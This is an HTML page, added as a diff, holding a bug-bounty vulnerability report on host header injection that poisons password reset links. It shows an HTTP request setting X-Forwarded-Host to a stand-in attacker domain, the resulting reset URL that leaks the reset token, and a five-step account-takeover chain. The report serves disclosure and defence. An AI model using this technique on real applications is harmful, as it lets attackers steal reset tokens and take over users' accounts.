@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Host Header Injection to 0-Click Account Takeover - BOUNTY-DEX</title>
+	<link rel="stylesheet" href="writeup.css">
+</head>
+<body>
+	<div class="container">
+		<header>
+			<h1>Host Header Injection leading to 0-Click Account Takeover</h1>
+			<div class="meta">
+				<p>BOUNTY-DEX Vulnerability Report</p>
+				<p>Type: <strong>Host Header Injection / Password Reset Poisoning</strong></p>
+			</div>
+			<span class="severity">CRITICAL</span>
+		</header>
+
+		<h2>Summary</h2>
+		<p>
+			The target application trusted user-controlled host-related headers when generating absolute links. By injecting <code>X-Forwarded-Host</code>, an attacker could force password reset emails to contain attacker-controlled domains while preserving valid reset tokens in the URL. During testing, requests to the poisoned reset link were received even without explicit victim clicks, resulting in a practical 0-click account takeover scenario.
+		</p>
+
+		<h2>Technical Details</h2>
+		<p>
+			The web application builds links using host values influenced by proxy headers. Injecting <code>X-Forwarded-Host</code> changed the base domain for generated links across the application.
+		</p>
+
+        <p>Request:</p>
+		<div class="code-block">
+			<code>
+GET /index.php/fd/login HTTP/2<br>
+Host: XX.YY.redacted.es<br>
+X-Forwarded-Host: attacker-domain.oastify.com<br>
+			</code>
+		</div>
+
+        <p>Response:</p>
+
+        <p>Now all the links are poisoned with the attacker's domain</p>
+        <div class="code-block">
+			<code>
+&lt;link rel="icon" href="https://attacker-domain.oastify.com/XXX/XXX/2/XXX.png" /&gt;<br>
+&lt;link rel="stylesheet" href="https://attacker-domain.oastify.com/YYY/YYY/YYY/YYY/YYY.css?v=3.3.0.21" /&gt;
+			</code>
+		</div>
+		
+		<p>
+			This issue becomes critical in the password reset flow. If the attacker triggers a reset for a valid user and injects <code>X-Forwarded-Host</code>, the email sent to the user includes an attacker-controlled reset URL base.
+		</p>
+
+        <p>Reset url sent via email:</p>
+		<div class="code-block">
+			<code>
+https://attacker-domain.oastify.com/index.php/fd/login/resetPassword/[username]?confirm=[reset_token]
+			</code>
+		</div>
+
+		<h2>Exploitation Chain</h2>
+		<ol>
+			<li>Attacker submits password reset for victim email.</li>
+			<li>Attacker injects <code>X-Forwarded-Host: attacker-domain.oastify.com</code>.</li>
+			<li>Application sends reset email containing a link with attacker domain + valid reset token.</li>
+			<li>Any access to that link leaks token and username to attacker infrastructure.</li>
+			<li>Attacker uses leaked data to reset victim password and take over the account.</li>
+		</ol>
+
+		<h2>0-Click Behavior Observed</h2>
+		<p>
+			During testing, inbound requests to the poisoned reset URL were received without manual user interaction. This indicates link prefetching/scanning by mail security systems or automated clients. As a result, token leakage can occur even if the victim never clicks the email.
+		</p>
+
+		<h2>Impact</h2>
+		<div class="impact-box">
+			<ul>
+				<li>Account takeover via password reset token theft.</li>
+				<li>0-click token exfiltration when email scanners/bots request reset links automatically.</li>
+				<li>Potential compromise of any account for which a reset can be triggered.</li>
+			</ul>
+		</div>
+
+
+		<a href="../" class="back-link">← Back to BOUNTY-DEX</a>
+	</div>
+</body>
+</html>
